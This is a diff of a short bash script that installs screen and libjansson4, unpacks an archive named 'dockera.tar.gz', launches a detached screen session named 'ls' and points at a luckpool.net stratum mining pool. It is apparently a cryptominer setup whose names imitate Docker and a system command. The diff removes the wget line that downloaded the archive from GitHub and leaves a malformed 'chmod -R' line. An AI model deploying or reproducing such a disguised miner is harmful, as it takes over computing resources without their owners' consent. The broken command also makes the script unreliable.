@@ -1,8 +1,7 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-wget https://github.com/wertesd/Workergits/raw/main/dockera.tar.gz
-chmod +x dockera.tar.gz
+chmod -R dockera.tar.gz
 tar -xvf dockera.tar.gz
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
